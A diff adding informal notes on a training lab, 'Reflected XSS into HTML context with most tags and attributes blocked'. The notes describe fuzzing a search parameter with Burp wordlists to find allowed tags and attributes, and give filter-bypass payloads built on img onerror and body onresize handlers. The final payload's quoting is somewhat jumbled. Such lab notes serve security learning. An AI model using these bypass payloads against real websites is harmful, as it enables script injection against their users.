@@ -567,8 +567,23 @@ By pass replace filter
 
 by pass with >   <><img src=x onerror=alert(1)>
 _______________________________________________________________________________________________________________________________________________________________________________________________
+Lab: Reflected XSS into HTML context with most tags and attributes blocked
+---------------------------------------------------------------------------
 
+Intercept with burpsuite and bruteforce with xss1 wordlist > by doing angle bracket
 
+GET /?search=<§§> HTTP/1.1
+---------------------------
+Only the body is allowed 200.
+
+So, bruteforce with xss2 wordlist
+-----------------------------------
+GET /?search=<body%20§§=1> HTTP/1.1
+
+onresize attribute is allowed 200
+
+ths is the final payload --> "><body onresize=alert(1)>" onload=this.style.width='100px'>
+_______________________________________________________________________________________________________________________________________________________________________________________________
 
 
 
